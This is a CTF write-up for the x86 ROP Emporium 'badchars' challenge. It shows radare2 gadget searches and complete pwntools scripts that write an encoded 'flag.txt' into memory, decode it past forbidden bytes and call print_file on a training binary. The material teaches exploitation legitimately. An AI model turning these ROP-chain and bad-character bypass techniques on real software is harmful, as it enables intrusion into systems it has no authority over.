---
layout: post
title:  "ROP Emporium badchars Writeup (x86)"
date:   2024-06-05 00:00:00 -0400
categories: rop-emporium challenge-5
tags: rop-emporium badchars x86 writeup buffer-overflow rop reverse-engineering 32-bit
---
## Introduction
[ROP Emporium](https://ropemporium.com/index.html){:target="_blank"}{:rel="noopener noreferrer"}
provides a series of challenges to learn and practice
Return Oriented Programming (ROP). This is the
[fifth challenge](https://ropemporium.com/challenge/badchars.html){:target="_blank"}{:rel="noopener noreferrer"}
of eight.

> This is what a hint will look like!
{: .prompt-tip }

### Goal
According to the
[challenge page](https://ropemporium.com/challenge/badchars.html){:target="_blank"}{:rel="noopener noreferrer"}
our goal is to call `print_file()` with the name of the
file to read as the first argument. The string `flag.txt`
doesn't exist in the binary, so we will need to write it
there ourselves. In addition to this, there will be
forbidden characters we're not allowed to use anywhere
in our payload!

## Exploit Crafting
The offset for `x86` challenges will be `44 bytes`. If
you want to know how to find this value see the
[first writeup]({% post_url 2024-05-31-rop-emporium-ret2win-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
of this series.

### Writing to Memory
> Check out `usefulFunction`'s assembly
{: .prompt-tip }

Using `radare2` we can analyze a binary by
running `aaa`. We will need to write `flag.txt` to
memory so let's check the `usefulGadgets` section
in `usefulFunction`
We can view the assembly with the following commands

```
s sym.usefulFunction
V
p
```

![useful gadgets](/images/badchars/x86-useful-gadgets.png)

There are a few gadgets here! Most of them are potential
routes to decode our payload, but for now we'll focus on
the last one.
The `mov` instruction will set the value from
`esi` (4 byte dword) into the dereferenced address 
set in `edi`. This is what we'll use to write to memory
and its address is `0x0804854f`

#### Setting Arguments
> Find a gadget to control `esi` and `edi`
{: .prompt-tip }
Now we need to find a gadget which can control `esi` and
`edi` to control what to write and where to write it. We
can use the `/R` command to search for gadgets
```
/R pop esi
```

![mov args gadget](/images/badchars/x86-mov-args-gadget.png)

Up until now we've been able to find gadgets
that do exactly what we need, but now we have to deal
deal with extra instructions. Luckily, these instructions
can be ignored by adding junk to `pop` onto the stack until
the `ret` instruction is reached.

By skipping the `pop ebx` instruction the address of our
gadget address becomes `0x080485b9`

#### Writing Location
> Find a writable program segment
{: .prompt-tip }
Now that we can control where to write and what to write,
where and what should we write? We want to open `flag.txt`
so we'll set that into `esi`. But we need to find a
suitable location to write to. We can view writable
sections with the command `iS`

![writable sections](/images/badchars/x86-writable-sections.png)

We need to find a section with the `w` permission and a
size of at least 8 bytes (0x08). Let's use the
`.data` section which has the address `0x0804a018`

Here is some python code to write to an address
```python
#!/bin/python3
from pwn import *

write_addr = 0x0804a018     # data addr
mov_addr = 0x0804854f       # mov qword [edi], esi
pop_regs = 0x080485b9       # pop esi, edi, ebp
junk = 0xdeadbeef

# write string s to address addr
# return ropchain in bytes
def write_str(addr, s):
    payload = b''
    ebp = p32(junk)

    # write every 4 bytes of a string
    for i in range(0, len(s), 4):

        # prevent slice out of bounds
        j = i+4
        if j > len(s):
            j = len(s)

        # 4 bytes to write
        esi = p32(int.from_bytes(s[i:j], 'little'))
        # address to write to
        edi = p32(addr + i)

        # fill mov args
        payload += p32(pop_regs) + esi + edi + ebp
        # write bytes
        payload += p32(mov_addr)
    return payload
```

### print_file()
> Find the `print_file` address and a single `pop` gadget
{: .prompt-tip }

First let's find the address of `print_file()` using
the command `afl`

![print-file-addr](/images/badchars/x86-print-file-addr.png)

`print_file` is part of a library so we can just use the
address of corresponding `plt` entry, `0x080483d0`

Now we need to set the first argument to this function.
According to the
[x86 calling convention](https://aaronbloomfield.github.io/pdr/book/x86-32bit-ccc-chapter.pdf){:target="_blank"}{:rel="noopener noreferrer"},
function arguments are passed through the stack. Remember
from the
[callme challenge]({% post_url 2024-06-02-rop-emporium-callme-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}
that we'll need to set a `pop` gadget as a function's return
address to keep the stack maintained for additional function
calls. We can just use the `pop` gadget we found earlier!

![mov args gadget](/images/badchars/x86-mov-args-gadget.png)

We only need to `pop` one argument
so our gadget address is `0x080485bb`

Here's how we'll call `print_file` in our payload

```python
#!/bin/python3
from pwn import *

pop_ebp = 0x080485bb

# add function args (x86)
def add_args(pop_addr, args):
    payload = p32(pop_addr)
    for a in args:
        payload += p32(a)
    return payload

# call print_file
payload = b'A' * 44
payload += p32(print_file_addr)
payload += add_args(pop_ebp, [write_addr])
```

### Bad Chars
All of our prep work is done, so now we can
deal with the main part of this challenge.
The challenge binary will tell us which characters
are forbidden so let's get a list

![bad chars](/images/badchars/x86-bad-chars.png)

We're not allowed to have any of these characters in
our payload. This is what happens when we call
`print_file()` with the filename set to `flag.txt`

![no encoding](/images/badchars/x86-no-encoding.png)

The invalid characters get replaced with `0xeb`. This
isn't limited to arguments, it will affect every address 
in our payload. To
get past this we can encode the `flag.txt` string,
write the encoded string to memory, decode the
written string, then call `print_file`

Let's take a look at the `usefulGadgets` section in
`usefulFunction` again

![useful gadgets](/images/badchars/x86-useful-gadgets.png)

We have three options to decode our string in memory,
`xor`, `add`, and `sub`. All of these instructions have
the capability to decode our ciphertext, but we'll
use the `sub` instruction which has
the address `0x0804854b`

First let's write a function to encode our string.
We're going to use a `sub` gadget to decode the
cipher text so we'll need to add values to encode
it. We'll add 2 to every character since adding 1
would turn the `f` in `flag.txt` into a `g` which
is a forbidden character. The encoding function
looks like this

```python
def encode_str(s):
    blist = bytearray(s)
    for i in range(0, len(blist)):
        blist[i] += 2
    return blist
```

Now let's write a function to decode our cipher text.
The value we want to subtract will be placed into `bl` (2)
and `ebp` will have the address of the byte we want to 
decode. The `bl` register refers to the lower 8 bits of
the `ebx` register. We already have a `pop ebp` gadget
so let's find a `pop ebx` gadget as well

```
/R pop ebx
```

![pop ebx](/images/badchars/x86-pop-ebx.png)

Our gadget address is `0x080485d6` so now we can
write a decoding function

```python
#!/bin/python3
from pwn import *

sub_addr = 0x0804854b       # sub byte [ebp], bl
pop_ebp = 0x080485bb        # ebp = address to modify with sub
pop_ebx = 0x080485d6        # bl is low 8 of ebx

def decode_str(addr, s):
    payload = b''
    # subtract 2 from every character
    for i in range(0, len(s)):
        # value to subtract
        ebx = p32(0x2)
        # address to modify
        ebp = p32(addr + i)
        payload += p32(pop_ebx) + ebx
        payload += p32(pop_ebp) + ebp
        payload += p32(sub_addr)
    return payload
```

In addition to this, we can add a check to determine
if an invalid character is present in our payload just
to be safe

```python
# check if payload is valid
invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]
for i in range(len(payload)):
    if payload[i] in invalid_bytes:
        print('invalid char', '"'+chr(payload[i])+'"', 'at index', i)
        exit()
```

## Exploit
We finally have everything we need to build the exploit

```python
#!/bin/python3
from pwn import *

# useful addresses
write_addr = 0x0804a018     # data addr
mov_addr = 0x0804854f       # mov qword [edi], esi
pop_regs = 0x080485b9       # pop esi, edi, ebp
sub_addr = 0x0804854b       # sub byte [ebp], bl
pop_ebp = 0x080485bb        # ebp = address to modify with sub
pop_ebx = 0x080485d6        # bl is low 8 of ebx
print_file_addr = 0x080483d0
junk = 0xdeadbeef

invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]

# write string s to address addr
# return ropchain in bytes
def write_str(addr, s):
    payload = b''
    ebp = p32(junk)

    # write every 4 bytes of a string
    for i in range(0, len(s), 4):

        # prevent slice out of bounds
        j = i+4
        if j > len(s):
            j = len(s)

        # 4 bytes to write
        esi = p32(int.from_bytes(s[i:j], 'little'))
        # address to write to
        edi = p32(addr + i)

        # fill mov args
        payload += p32(pop_regs) + esi + edi + ebp
        # write bytes
        payload += p32(mov_addr)
    return payload

# subtract 2 from every character
def decode_str(addr, s):
    payload = b''
    # subtract 2 from every character
    for i in range(0, len(s)):
        # value to subtract
        ebx = p32(0x2)
        # address to modify
        ebp = p32(addr + i)
        payload += p32(pop_ebx) + ebx
        payload += p32(pop_ebp) + ebp
        payload += p32(sub_addr)
    return payload

# add 2 to every character
def encode_str(s):
    blist = bytearray(s)
    # add 2 to every character
    for i in range(0, len(blist)):
        blist[i] += 2
    return blist
    
# add function args (x86)
def add_args(pop_addr, args):
    payload = p32(pop_addr)
    for a in args:
        payload += p32(a)
    return payload

# build payload
payload = b'A' * 44
fname = encode_str(b'flag.txt')
payload += write_str(write_addr, fname)
payload += decode_str(write_addr, fname)
# call print_file
payload += p32(print_file_addr)
payload += add_args(pop_ebp, [write_addr])

# check if payload is valid
for i in range(len(payload)):
    if payload[i] in invalid_bytes:
        print('invalid char', '"'+chr(payload[i])+'"', 'at index', i)
        exit()

# send payload + receive flag
io = process('./badchars32')
io.send(payload)
io.recvuntil(b'Thank you!\n')
flag = io.recvline()
log.success(flag.decode('utf-8'))
```

![flag](/images/badchars/x86-flag.png)

### Extra Credit
If you've made it this far in the series then you're
probably comfortable chaining gadgets together. From
here on out we'll be working with various constraints
such as sparse gadgets or a limited stack size. Depending
on the conditions, the size of our payload may matter!

The first solution is simpler to code, but we could
make the size of our payload smaller. The largest 
amount of space could be saved by not encoding every
byte of the string, but only encoding the forbidden
characters! A smaller optimization could
be applied to our decoding function. Since `ebx` is
set to the same value during decoding, we only need
to set it once during the whole decoding process!

Here are the updated functions which produces a payload 
that is more space efficient

```python
#!/bin/python3
from pwn import *

invalid_bytes = [ord('x'), ord('g'), ord('a'), ord('.')]
sub_addr = 0x0804854b       # sub byte [ebp], bl
pop_ebp = 0x080485bb        # ebp = address to modify with sub
pop_ebx = 0x080485d6        # bl is low 8 of ebx

# subtract 1 at proper indices
sub_indices = []
def decode_str(addr, s):
    payload = b''
    ebx_set = False
    for i in range(0, len(s)):
        # only subtract encoded indices
        if i not in sub_indices:
            continue
        # only set ebx once
        if not ebx_set:
            ebx = p32(0x1)
            payload += p32(pop_ebx) + ebx
            ebx_set = True
        ebp = p32(addr + i)
        payload += p32(pop_ebp) + ebp
        payload += p32(sub_addr)
    return payload

# add 1 to forbidden chars 
def encode_str(s):
    blist = bytearray(s)
    for i in range(0, len(blist)):
        if blist[i] in invalid_bytes:
            blist[i] += 1
            # add index to decode
            sub_indices.append(i)
    return blist
```

![smaller payload](/images/badchars/x86-smaller-payload.png)

We made the payload 104 bytes smaller!

## Conclusion
In this challenge we learned how to bypass forbidden
characters in our ROP chain by decoding an encoded string
in memory. Next we'll learn how to write to memory with
more complicated gadgets.

[Previous Challenge (write4)]({% post_url 2024-06-04-rop-emporium-write4-x86 %}){:target="_blank"}{:rel="noopener noreferrer"}

Next Challenge (fluff)

[badchars x64]({% post_url 2024-06-05-rop-emporium-badchars-x64 %}){:target="_blank"}{:rel="noopener noreferrer"}
